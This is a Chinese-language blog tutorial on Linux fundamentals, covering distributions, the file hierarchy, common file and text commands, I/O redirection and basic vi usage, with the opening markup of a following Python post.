          <h1 id="Linux-基础"><a href="#Linux-基础" class="headerlink" title="Linux 基础"></a>Linux 基础</h1><h2 id="1-Linux-介绍"><a href="#1-Linux-介绍" class="headerlink" title="1. Linux 介绍"></a>1. Linux 介绍</h2><h3 id="1-1-Linux-的介绍"><a href="#1-1-Linux-的介绍" class="headerlink" title="1.1 Linux 的介绍"></a>1.1 Linux 的介绍</h3><p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX和Unix的多用户、多任务、支持多线程和多CPU的操作系统。​Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。​严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。</p>
<h3 id="1-2-Linux-的发行版"><a href="#1-2-Linux-的发行版" class="headerlink" title="1.2 Linux 的发行版"></a>1.2 Linux 的发行版</h3><p>Linux有上百种不同的发行版，其中大体分为两类，一类是商业公司维护的发行版本，一类是社区组织维护的发行版本。如基于商业开发的Red Hat Enterprise Linux、SUSE、Oracle Linux，和基于社区开发的debian、archlinux等。前者以著名的Redhat（RHEL）为代表，后者以Debian为代表。</p>
<p>Redhat，应该称为Redhat系列，包括RHEL(Redhat Enterprise Linux，也就是所谓的Redhat Advance Server，收费版本)、Fedora Core(由原来的Redhat桌面版本发展而来，免费版本)、CentOS(RHEL的社区克隆版本，免费)。Redhat应该说是在国内使用人群最多的Linux版本，甚至有人将Redhat等同于Linux。Redhat系列的包管理方式采用的是基于RPM包的YUM包管理方式，包分发方式是编译好的二进制文件。稳定性方面RHEL和CentOS的稳定性非常好，适合于服务器使用，但是Fedora Core的稳定性较差，最好只用于桌面应用。</p>
<p>Debian，或者称Debian系列，包括Debian和Ubuntu等，我们所用的kali也属于这个系列。Debian是社区类Linux的典范，是迄今为止最遵循GNU规范的Linux系统。Debian最早由Ian Murdock于1993年创建。Debian最具特色的是apt-get / dpkg包管理方式。</p>
<p>在实际使用中，所感受到的最大差别应是两个体系在安装软件时所用的软件包的安装方式不同，例如redhat的yum与RPM，debian的apt-get与dpkg。有关这方面知识我们会在下节课详述。</p>
<p>除了这具有代表性的两大体系外，Linux发行版还有其他体系，例如Slackware系的SUSE Linux。我们的教程主要使用的是redhat与debian系。</p>
<h3 id="2-Linux的文件结构"><a href="#2-Linux的文件结构" class="headerlink" title="2. Linux的文件结构"></a>2. Linux的文件结构</h3><p>在Linux系统中有一个重要的概念：一切都是文件。 其实这是UNIX哲学的一个体现，而Linux是重写UNIX而来，所以这个概念也就传承了下来。在UNIX系统中，把一切资源都看作是文件，包括硬件设备。</p>
<p>在Linux系统中文件后缀是没有作用的，后缀名只是为了能让自己能够更好的区别文件的作用。</p>
<p>Linux系统中的各类文件被Linux使用目录树进行管理， 所谓的目录树就是以根目录 <code>/</code> 为主，向下呈现分支状的一种文件结构。<br><img src="/image/Linux文件结构.png" alt="Linux文件结构"></p>
<p>与Windows 系统不同，Linux 系统没有C盘、D盘、E盘那么多的盘符，只有一个根目录（/），所有的文件（资源）都存储在以根目录（/）为树根的树形目录结构中。</p>
<ol>
<li>这样做最明显的好处是，开发者仅需要使用一套 API 和开发工具即可调取 Linux 系统中绝大部分的资源。举个简单的例子，Linux 中几乎所有读（读文件，读系统状态，读 socket，读PIPE）的操作都可以用read函数来进行；几乎所有更改（更改文件，更改系统参数，写 socket，写 PIPE）的操作都可以用write函数来进行。</li>
<li>不利之处在于，使用任何硬件设备都必须与根目录下某一目录执行挂载操作，否则无法使用。我们知道，本身Linux具有一个以根目录为树根的文件目录结构，每个设备也同样如此，它们是相互独立的。如果我们想通过Linux上的根目录找到设备文件的目录结构，就必须将这两个文件系统目录合二为一，这就是挂载的真正含义。</li>
</ol>
<p>下面介绍Linux根目录下的各个目录：</p>
<ul>
<li><code>/bin</code> 目录下包含了用户命令文件，也就是<strong>shell</strong>命令</li>
<li><code>/boot</code> 包含了系统启动过程中所需要的所有内容</li>
<li><code>/dev</code> 目录是设备文件或者专有文件的存放位置</li>
<li><code>/etc</code> 目录包含了系统的配置文件。</li>
<li><code>/root  /home</code> 用户专有的家目录。一个影虎对自己家目录拥有绝对的控制权</li>
<li><code>/lib</code> 目录里面存放着共享库和内核模块。在系统的启动阶段和运行根文件系统的各种命令时，都需要用到这些共享库，所以必须与根文件放在一起。</li>
<li><code>/media</code> 与 <code>/mnt</code> 是常见挂载点。</li>
<li><code>/opt</code> 目录系统附加软件的存放地址</li>
<li><code>/sbin</code> 目录必备的系统软件存放处。用户系统维护的软件和某些只限<strong>root</strong>用户使用的命令存储在 <em>/sbin /usr/sbin</em> 以及 <em>/usr/local/sbin</em> 目录下。</li>
<li><code>/srv</code> 目录某些服务进程启动以后，他们需要读取的数据会放在<strong>srv</strong>目录中</li>
<li><code>/tmp</code> 目录存放临时文件。任何程序都不用对 <strong>/tmp</strong> 目录下的任何文件或目录负责</li>
<li><code>/var</code> 目录包含着系统中绝大多数的随时变化着的数据，比如系统日志。/var的某些内容是不能共享给其他系统的，典型的就是/var/logs /var/run。当然某些是可以共享的，如/var/spool/news。</li>
</ul>
<h2 id="3-Linux-常用命令总结"><a href="#3-Linux-常用命令总结" class="headerlink" title="3. Linux 常用命令总结"></a>3. Linux 常用命令总结</h2><h3 id="3-1-Linux-的命令格式"><a href="#3-1-Linux-的命令格式" class="headerlink" title="3.1 Linux 的命令格式"></a>3.1 Linux 的命令格式</h3><p>linux命令的格式表现为：命令+选项+对象</p>
<p><code>COMMAND options arguments</code></p>
<p>具体说明:<br><strong>COMMAND</strong>: 表示命令的名称, 如 <code>ls</code> 。<br><strong>options</strong>: 定义命令的执行特性，可以有长短两种选项：</p>
<ul>
<li>长选项: 用 — 引导,后面跟完整的单词,如 <code>--help</code></li>
<li>短选项: 用 - 引导,后面跟单个的字符, 如 <code>-a</code></li>
<li>多个短选项可以组合使用,例如: <code>-h</code> <code>-l</code> <code>-a</code> <code>==</code> -<code>hla</code>， 但是长选项不能组合使用,如 —help后面就不能再跟另外一个单词了。</li>
</ul>
<p>options也可以有自己的参数，<strong>注意：选项与选项之间、选项与参数之间、参数与参数之间必须有空格。</strong><br>arguments：表示命令的作用对象，如上述示例中farmsec 就是ls命令的作用对象。<br><strong>在Linux中严格区分大小写。</strong></p>
<h3 id="3-2-Linux-获取命令帮助的方式"><a href="#3-2-Linux-获取命令帮助的方式" class="headerlink" title="3.2 Linux 获取命令帮助的方式"></a>3.2 Linux 获取命令帮助的方式</h3><p>使用<code>-h</code>,<code>–help</code>和<code>man</code>可以查看命令的帮助文件。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping -h</span><br><span class="line">cp --help</span><br><span class="line">man cp</span><br></pre></td></tr></table></figure></p>
<h3 id="3-3-绝对路径与相对路径"><a href="#3-3-绝对路径与相对路径" class="headerlink" title="3.3 绝对路径与相对路径"></a>3.3 绝对路径与相对路径</h3><p>绝对路径就是你的主页上的文件或目录在硬盘上真正的路径，linux的绝对路径是指从根目录说起的。万物起源为<code>/</code>目录 。<br>例如： <code>/dev/somedir/...</code>   <code>/etc/password</code><br>而相对路径则是从当前目录说起: 即 <code>./</code>。例如在当前目录为根的情况下的<code>./usr/bin</code>和<code>usr/bin</code>是一个目录。</p>
<h3 id="3-4-Tab键的使用"><a href="#3-4-Tab键的使用" class="headerlink" title="3.4 Tab键的使用"></a>3.4 Tab键的使用</h3><p>Tab键的两大作用:</p>
<ul>
<li>tab补全：只需输入文件或目录名以及命令的前几个字符，然后按TAB键，如无相重的，完整的文件名或者命令立即自动在命令行出现；如有相重的，再按一下TAB键，系统会列出当前目录下所有以这几个字符开头的名字。</li>
<li>tab键查看：在命令行下，只需输入例如m，再连续按两次TAB键，系统将列出所有以m开头的命令，(包括自定义的Bshell命令函数)，对查找某些记不清楚的命令特有用。熟练使用tab键可提高工作效率。</li>
</ul>
<h3 id="3-5-四个特殊文件名"><a href="#3-5-四个特殊文件名" class="headerlink" title="3.5 四个特殊文件名"></a>3.5 四个特殊文件名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.    #代表当前目录</span><br><span class="line">..   #代表上一级目录</span><br><span class="line">-    #代表上一个工作的目录</span><br><span class="line">~    #代表家目录（root为/root,其他用户在/home下)</span><br></pre></td></tr></table></figure>
<h2 id="4-Linux-常用命令"><a href="#4-Linux-常用命令" class="headerlink" title="4. Linux 常用命令"></a>4. Linux 常用命令</h2><p>接下来，我们要开始了解一部分常用Linux命令。你可以选择在上一节搭建好的centos环境中练习命令，远程连接到centos的命令为ssh root@ip。你也可以在kali上使用linux命令，除了打开命令终端的方式，还可使用快捷键以将图形化界面切换为字符界面。按CTRL+ALT+F3至F7，kali将切换至字符界面。按CTRL+ALT+F1至F2，kali将切换回图形化界面。</p>
<h3 id="4-1-mkdir-命令-make-directory"><a href="#4-1-mkdir-命令-make-directory" class="headerlink" title="4.1 mkdir 命令     (make directory)"></a>4.1 mkdir 命令     (make directory)</h3><p><code>mkdir</code> 命令用于创建目录。<br>用法：<code>mkdir [选项] [目录名]
参数：</code>-p` 创建多级目录，如果目录名称不存在，就创建一个。<br>案例：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir mortal</span><br><span class="line">mkdir mortal1 mortal2</span><br><span class="line">mkdir -p mortal3/mortral4</span><br></pre></td></tr></table></figure></p>
<h3 id="4-2-ls-命令-list-files"><a href="#4-2-ls-命令-list-files" class="headerlink" title="4.2 ls 命令     (list files)"></a>4.2 ls 命令     (list files)</h3><p><code>ls</code> 命令用于显示指定工作目录下之内容（列出指定目录所含之文件及子目录)，ls命令的输出信息可以进行彩色加亮显示，以区分不同类型的文件。<br>用法：`ls [项目] [目录]<br>参数:</p>
<ul>
<li><code>-a</code>显示所有文件及目录（<strong>.</strong>开头的隐藏文件也会列出）</li>
<li><code>l</code>除文件名称外，也将文件型态、权限、拥有者、文件大小等咨询详细列出</li>
<li><code>-h</code>以人类定义的格式列出文件大小<br>案例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">ls -l</span><br><span class="line">ls -a mortal3</span><br><span class="line">ls -al mortal3</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="4-3-pwd-命令-print-work-directory"><a href="#4-3-pwd-命令-print-work-directory" class="headerlink" title="4.3 pwd 命令    (print work directory)"></a>4.3 pwd 命令    (print work directory)</h3><p><code>pwd</code>命令以绝对路径的方式显示用户当前工作目录。命令将当前目录的全路径名称（从根目录）写入标准输出。全部目录使用/分隔。第一个/表示根目录，最后一个目录是当前目录。执行pwd命令可立刻得知您目前所在的工作目录的<strong>绝对路径名称</strong>。<br>用法：<code>pwd</code><br>案例：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure></p>
<h3 id="4-4-cd-命令-change-directory"><a href="#4-4-cd-命令-change-directory" class="headerlink" title="4.4 cd 命令     (change directory)"></a>4.4 cd 命令     (change directory)</h3><p><code>cd</code> 命令用于切换当前工作目录<br>用法：<code>cd [目录]</code></p>
<p>用法：`cd [绝对路径]</p>
<p>用法：<code>.</code>代表当前目录，<code>..</code>代表上一级目录，<code>cd~</code>用于切换至登录用户家目录。<code>cd-</code>用于回到上一个目录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd .</span><br><span class="line">cd ..</span><br><span class="line">cd ~</span><br><span class="line">cd -</span><br></pre></td></tr></table></figure>
<h3 id="4-5-touch-命令"><a href="#4-5-touch-命令" class="headerlink" title="4.5 touch 命令"></a>4.5 touch 命令</h3><p><code>touch</code>命令用于创建一个空白的新文件，如果同名文件已存在，则修改其时间属性。</p>
<p>用法：<code>touch [选项] [文件名]</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch mortal</span><br></pre></td></tr></table></figure>
<h3 id="4-6-cp-命令-copy-file"><a href="#4-6-cp-命令-copy-file" class="headerlink" title="4.6 cp 命令     (copy file)"></a>4.6 cp 命令     (copy file)</h3><p><code>cp</code>命令主要用于复制文件或目录。<br>用法：`cp [选项] [源文件]<br>参数:</p>
<ul>
<li><code>-r</code>: 若给出的源文件是一个目录文件，此时将复制该目录下所有的子目录和文件。（递归）</li>
<li><code>-p</code>: 除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。(保持默认属性)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp mor mortal1</span><br><span class="line">cp /root/mortal/mortal1 mortal111</span><br><span class="line">cp /root/mortal1/mor1 /root/mortal2</span><br><span class="line">cp -r mortal111 mortal3/mortral4</span><br></pre></td></tr></table></figure>
<h3 id="4-7-mv-命令-move-file"><a href="#4-7-mv-命令-move-file" class="headerlink" title="4.7 mv 命令     (move file)"></a>4.7 mv 命令     (move file)</h3><p><code>mv</code>命令用来为文件或目录改名、或将文件或目录移入其它位置。<br>用法：`mv [选项] [源文件/源目录] [目录]<br>参数:</p>
<ul>
<li><code>-f</code>: 如果指定移动的源目录或文件与目标的目录或文件同名，不会询问，直接覆盖旧文件。（直接覆盖不询问）</li>
<li><code>-n</code>: 不要覆盖任何已存在的文件或目录。(不覆盖已存在的文件)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv mortal1 m1</span><br><span class="line">mv m1 mortal111</span><br><span class="line">mv mortal mortal1</span><br></pre></td></tr></table></figure>
<p><code>mv</code>命令的另一种用法是将文件剪切</p>
<p>`mv [路径/文件名] [路径/文件名]<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv 1.txt /root</span><br><span class="line">mv 2.txt /root/3.txt</span><br><span class="line">mv /root/2.txt /root/1/1.txt</span><br></pre></td></tr></table></figure></p>
<h2 id="5-文本查看相关命令"><a href="#5-文本查看相关命令" class="headerlink" title="5. 文本查看相关命令"></a>5. 文本查看相关命令</h2><h3 id="5-1-cat-命令-concatenate"><a href="#5-1-cat-命令-concatenate" class="headerlink" title="5.1 cat 命令    (concatenate)"></a>5.1 cat 命令    (concatenate)</h3><p><code>cat</code>命令用于打开文件查看文件内容。<br>用法：`cat [选项] [文件]<br>案例：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><code>cat -v mortal</code><br>参数：</p>
<ul>
<li><code>-v</code>： 除了LFD(换行)和TAB之外所有的控制符，用<code>^</code>和<code>M-</code>显示。</li>
</ul>
<h3 id="5-2-echo-命令"><a href="#5-2-echo-命令" class="headerlink" title="5.2 echo 命令"></a>5.2 echo 命令</h3><p><code>echo</code>命令用于输出指定内容<br>用法：<code>echo &#39;[文本]&#39;</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `123`</span><br></pre></td></tr></table></figure></p>
<p>利用<code>&gt;&gt;</code>和<code>&gt;</code>也可以将输出内容写入到文件中。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;     #为覆盖</span><br><span class="line">&gt;&gt;    #为追加</span><br></pre></td></tr></table></figure><br>使用&gt;&gt;和&gt;可以将命令的输出结果保存于文件中。<br><code>cat /etc/passwd &gt;1.txt</code></p>
<h3 id="5-3-more-命令"><a href="#5-3-more-命令" class="headerlink" title="5.3 more 命令"></a>5.3 more 命令</h3><p><code>more</code> 命令类似 <code>cat</code> ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是，按空格键<code>Space</code>就往下一页显示，按<code>Enier</code>键显示文本的下一行内容,按 <code>b</code>键就会往回(back)一页显示，按q键退出。<br>用法：<code>more [选项] [文件]</code><br>案例：<br><code>more /etc/passwd</code></p>
<h3 id="5-4-less-命令"><a href="#5-4-less-命令" class="headerlink" title="5.4 less 命令"></a>5.4 less 命令</h3><p><code>less</code> 与<code>more</code>类似，用less命令显示文件时，用<code>PageUp</code>键向上翻页，用<code>PageDown</code>键向下翻页。要退出less程序按<code>q</code>键。<br>用法：<code>less [选项] [文件]
案例：</code>less /etc/passwd`</p>
<h3 id="5-5-head-命令"><a href="#5-5-head-命令" class="headerlink" title="5.5 head 命令"></a>5.5 head 命令</h3><p><code>head</code>命令用于查看文件的开头的内容。在默认情况下，head命令显示文件的头10行内容<br>用法：`head [选项] [文件]<br>参数：</p>
<ul>
<li><code>-n&lt;行数&gt;</code> 显示的行数<br>案例：显示<strong>passwd</strong>文件前两行<br><code>head -n 2 /etc/passwd</code></li>
</ul>
<h3 id="5-6-tail-命令"><a href="#5-6-tail-命令" class="headerlink" title="5.6 tail 命令"></a>5.6 tail 命令</h3><p><code>tail</code> 文件中的尾部内容。tail命令默认在屏幕上显示指定文件的末尾10行，如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题<br>用法：`tail [选项] [文件]</p>
<ul>
<li><p>参数: <code>-n &lt;行数&gt;</code> 显示的行数<br>案例： 查看passwd文件尾部三行内容。<br><code>tail -n /etc/passwd</code></p>
</li>
<li><p>参数：<code>-f</code>循环读取<br>案例：<br><code>tail -f /var/log/secure</code><br><code>/var/log/secure</code>是系统远程登录日志，我们可以通过<code>tail -f</code>命令监控日志变化情况。</p>
</li>
</ul>
<p>随后我们另开一个命令终端远程登录此台计算机。</p>
<p>可以看到<code>tail -f</code>命令监控到了日志变化。<code>Ctrl+c</code>取消命令。</p>
<p>使用管道操作符<code>|</code>可以把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出，依次类推。</p>
<p>案例： 只显示passwd文本的 20-25 行。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">head -n 25 /etc/passwd|nl| tail -n 5</span><br><span class="line">cat /etc/passwd|nl|head -n 25|tail -n 6</span><br></pre></td></tr></table></figure><br><img src="/image/显示文件指定行.png" alt="显示文件指定行"></p>
<h3 id="5-7-wc-命令-word-count"><a href="#5-7-wc-命令-word-count" class="headerlink" title="5.7 wc 命令     (word count)"></a>5.7 wc 命令     (word count)</h3><p><code>wc</code>命令用来计算数字。利用wc指令我们可以计算文件的Byte数、字数或是列数。<br>用法：<code>wc [选项] [文件]</code><br>参数：</p>
<ul>
<li><code>-l</code>显示行数</li>
<li><code>-c</code>显示Bytes数</li>
<li><code>-w</code>显示字数<br>案例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wc -l /etc/passwd</span><br><span class="line">wc -c /etc/passwd</span><br><span class="line">wc -w /etc/passwd</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="5-8-du-Disk-Usage"><a href="#5-8-du-Disk-Usage" class="headerlink" title="5.8 du      (Disk Usage)"></a>5.8 du      (Disk Usage)</h3><p><code>du</code>命令可查看文件使用空间<br>参数：</p>
<ul>
<li>-h 以K, M，G为单位，提高信息的可读性。<br>案例：<br><code>du -h /etc/passwd</code></li>
</ul>
<h3 id="5-9-df-命令-disk-free"><a href="#5-9-df-命令-disk-free" class="headerlink" title="5.9 df 命令     (disk free)"></a>5.9 df 命令     (disk free)</h3><p><code>df</code>命令用于显示磁盘分区上的可使用的磁盘空间。默认显示单位为KB。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。<br>用法：`df [选项]<br>参数：</p>
<ul>
<li><code>-h</code> 使用人类可读的格式<br>案例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="5-10-diff-命令"><a href="#5-10-diff-命令" class="headerlink" title="5.10 diff 命令"></a>5.10 diff 命令</h3><p><code>diff</code> 命令用于比较文件的差异。<br><code>diff</code>以逐行的方式，比较文本文件的异同处。如果指定要比较目录，则 diff 会比较目录中相同文件名的文件，但不会比较其中子目录。<br>案例：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff 1.txt 2.txt</span><br></pre></td></tr></table></figure><br>diff命令所参考的不是第一个文件，而是第二个文件，它的输出信息有以下几种字符：</p>
<ul>
<li>c:表示必须做一些修改才能使两个文件相同</li>
<li>a: 表示必须添加一些内容才能使两个文件相同</li>
<li>d: 表示必须删除一些内容才能使两个文件相同</li>
</ul>
<h2 id="6-输入-输出重定向"><a href="#6-输入-输出重定向" class="headerlink" title="6. 输入/输出重定向"></a>6. 输入/输出重定向</h2><p>大多数系统命令从您的终端获取输入并将结果输出发送回您的终端。</p>
<p>通常用于标准输出的命令的输出可以很容易地转移到文件中。此功能称为输出重定向。</p>
<p>正如命令的输出可以重定向到文件一样，命令的输入也可以从文件重定向。</p>
<h3 id="6-1-输出重定向"><a href="#6-1-输出重定向" class="headerlink" title="6.1 输出重定向"></a>6.1 输出重定向</h3><p>当我们执行命令时，命令的输出会显示在终端上。但有时，我们需要命令的输出保存在文件中，这时就需要<code>&gt;</code>和<code>&gt;&gt;</code>对命令输出进行重定向。<br><code>&gt;</code>符号，是将命令的输出存入文件，并覆盖文件原本的内容。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls &gt; 1.txt</span><br><span class="line">cat /etc/passwd &gt; 1.txt</span><br></pre></td></tr></table></figure></p>
<p><code>&gt;&gt;</code>符号，表示将命令输出结果追加入文件，不会覆盖文件内容。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;1&#x27; &gt;&gt; 1.txt</span><br><span class="line">echo &#x27;2&#x27; &gt;&gt; 2.txt</span><br></pre></td></tr></table></figure></p>
<h3 id="6-2-输入重定向"><a href="#6-2-输入重定向" class="headerlink" title="6.2 输入重定向"></a>6.2 输入重定向</h3><p>正如命令的输出可以可重定向到文件，命令的输入也可以重定向到文件。一般使用<code>&lt;</code>和<code>&lt;&lt;</code>，其中<code>&lt;&lt;</code>可以引入多行命令的输入。<br>用法：<code>command1 &lt; file1</code><br>这样，本来需要从键盘获取输入的命令会转移到文件读取内容。<br><strong>注意：输出重定向是大于号(&gt;)，输入重定向是小于号(&lt;)。</strong></p>
<p>案例：<br>我们需要统计 users 文件的行数,执行以下命令：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wc -l users</span><br><span class="line">    2 users</span><br></pre></td></tr></table></figure><br>也可以将输入重定向到 users 文件：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wc -l &lt; users</span><br><span class="line">       2 </span><br></pre></td></tr></table></figure><br>注意：上面两个例子的结果不同：第一个例子，会输出文件名；第二个不会，因为它仅仅知道从标准输入读取内容。</p>
<p><code>command1 &lt; infile &gt; outfile</code><br>同时替换输入和输出，执行command1，从文件infile读取内容，然后将输出写入到outfile中。</p>
<h3 id="6-3-Here-Document"><a href="#6-3-Here-Document" class="headerlink" title="6.3 Here Document"></a>6.3 Here Document</h3><p>Here Document 是 Shell 中的一种特殊的重定向方式，用来将输入重定向到一个交互式 Shell 脚本或程序。</p>
<p><code>&lt;&lt;</code>，则更为常用一些，它将运算符解释为读取输入的指令，直到找到包含指定分隔符的行。直到包含分隔符的行的所有输入行都被输入到命令的标准输入中。命令形式一般如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command &lt;&lt; delimiter</span><br><span class="line">    document</span><br><span class="line">delimiter</span><br></pre></td></tr></table></figure><br>它的作用是将两个 delimiter 之间的内容(document) 作为输入传递给 command。</p>
<p>其中delimiter代表用户定义的分隔符，两个分隔符之间，是输入的多行参数。</p>
<p>例如：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wc -l &lt;&lt; EOF</span><br><span class="line">abcd</span><br><span class="line">1234</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">## 其输出结果为2，统计了输入的行数。</span><br></pre></td></tr></table></figure></p>
<h2 id="7-VI-编辑器"><a href="#7-VI-编辑器" class="headerlink" title="7. VI 编辑器"></a>7. VI 编辑器</h2><p>v编辑器：<code>vi</code>是Linux系统的第一个全屏幕交互式编辑程序，它从诞生至今一直得到广大用户的青睐，历经数十年仍然是人们主要使用的文本编辑工具，它可以执行输出、删除、查找、替换、块操作等众多文本操作，而且用户可以根据自己的需要对其进行定制，这是其他编辑程序所没有的。 vi编辑器具有三种模式：<code>一般模式</code>、<code>编辑模式</code>、<code>指令模式</code>。 这三种模式可以通过观察vi界面的左下角判断。</p>
<p>在命令行执行<code>vi [文件名]</code>命令可进入vi编辑器并编辑文件，如果没有同名文件则创建。</p>
<p>此时，vi编辑器处于一般模式。</p>
<p>从<code>一般模式</code>输入字母<code>i</code>进入<code>编辑模式</code>，特征是左下角有插入字样。</p>
<p>在<code>编辑模式下</code>，可以用方向键移动光标，同时写入字符。</p>
<p><code>编辑模式</code>下按<code>ESC</code> 回到<code>一般模式</code>。</p>
<p><code>一般模式</code>下按<code>:</code>进入<code>命令模式</code>。特征是右下角有<code>:</code>。</p>
<p><code>命令模式</code>下常用指令：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">w         # 保存 write</span><br><span class="line">q         # 退出 quit</span><br><span class="line">wq        # 保存并退出</span><br><span class="line">q!        # 不保存强制退出</span><br><span class="line">set nu    # 显示行号</span><br><span class="line">wq!       # 强制保存并退出</span><br></pre></td></tr></table></figure></p>
<p>在<code>一般模式</code>下可使用的指令：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/farmsec           # 搜索“farmsec”内容</span><br><span class="line">gg                 # 光标立马回到第一行</span><br><span class="line">2                  # 光标向下跳2行，以此类推</span><br><span class="line">G                  # 移动到最后一行</span><br><span class="line">dd                 # 删除当前行</span><br><span class="line">d2j                # 删除当前行和下两行</span><br><span class="line">yy                 # 复制一行</span><br><span class="line">y2y                # 复制2行</span><br><span class="line">p (小写)            # 粘贴到光标之后</span><br><span class="line">P (大写)            # 粘贴到光标之前</span><br></pre></td></tr></table></figure></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2022/03/14/Python%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/14/Python%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">Python基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2022-03-14 14:10:09" itemprop="dateCreated datePublished" datetime="2022-03-14T14:10:09+08:00">2022-03-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
